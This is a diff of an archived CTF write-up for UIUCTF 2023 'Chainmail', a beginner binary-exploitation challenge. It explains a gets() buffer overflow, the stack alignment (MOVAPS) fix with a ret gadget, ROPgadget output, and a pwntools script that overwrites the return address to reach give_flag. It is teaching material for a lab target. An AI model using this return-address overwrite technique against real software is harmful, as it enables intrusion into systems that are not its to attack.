@@ -1,15 +1,10 @@
 # :game_die: UIUCTF 2023 - Chainmail. Chainmail
 
-> **Original Source:** [UIUCTF 2023 - Chainmail. Chainmail](https://infosecwriteups.com/uiuctf-2023-chainmail-a4b2de56a680)
-> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2023
-
 ---
 
 # UIUCTF 2023 — Chainmail
 
-
 Categories: pwn, beginner
-
 
 Description:
 
@@ -17,23 +12,17 @@ Description:
 
 I’ve come up with a winning idea to make it big in the Prodigy and Hotmail scenes (or at least make your email widespread)!
 
-
 $ nc chainmail.chal.uiuc.tf 1337
-
 
 author: Emma
 
-
 chal chal.c Dockerfile
-
 
 Tags: pwn, stack alignment, trivial
 
 ### Solution
 
-
 In the chal.c we got the source code
-
 
 ```
 #include <stdio.h>
@@ -68,41 +57,29 @@ return 0;
 }
 ```
 
-
 When we execute the program it prints out the welcome message and asks for a ***name***.
 It uses the vulnerable ***gets() ***function to read our response.
 
-
 ## Get Szigecsán Dávid’s stories in your inbox
-
 
 Join Medium for free to get updates from this writer.
 
-
 Remember me for faster sign in
-
 
 With a simple buffer overflow, we can overwrite the main function’s return address to execute the ***give_flag()*** function and provide the flag for us.
 
-
 We have all the information we need.
-
 
 The buffer size for the ***name*** variable: ***64 bytes***.
 Additional ***8 bytes*** to reach the return address.
 
-
 After trying the exploit locally, everything works perfectly, but when we try it on the remote machine, it won't work.
-
 
 The problem is the [stack alignment issue](https://ropemporium.com/guide.html#Common%20pitfalls) also known as the MOVAPS issue.
 
-
 To fix the MOVAPS issue we need an additional ret instruction in our payload.
 
-
 We can find the ret instruction with [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).
-
 
 ```
 $ ROPgadget --binary ./chal --ropchain
@@ -128,9 +105,7 @@ Gadgets information
 0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
 ```
 
-
 After that, we have our complete solution.
-
 
 ```
 #!/usr/bin/python
@@ -163,7 +138,6 @@ if args.destination == 'remote':
 ret_address = pwn.p64(0x40101a)
 payload = b'A' * 64 + b'B' * 8 + ret_address + give_flag_return_address
 
-
 # ================================================
 # Local / GDB / Remote
 # ================================================
@@ -186,9 +160,7 @@ pwn.warning("Flag: " + p.recv().decode('utf-8'))
 p.interactive()
 ```
 
-
 We can run it on the local or remote server, both cases will work properly.
-
 
 ```
 $ ./solution.py -t chainmail.chal.uiuc.tf -p 1337 remote
@@ -205,6 +177,3 @@ p.recvuntil("Jim\n")
 ```
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/uiuctf-2023-chainmail-a4b2de56a680). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
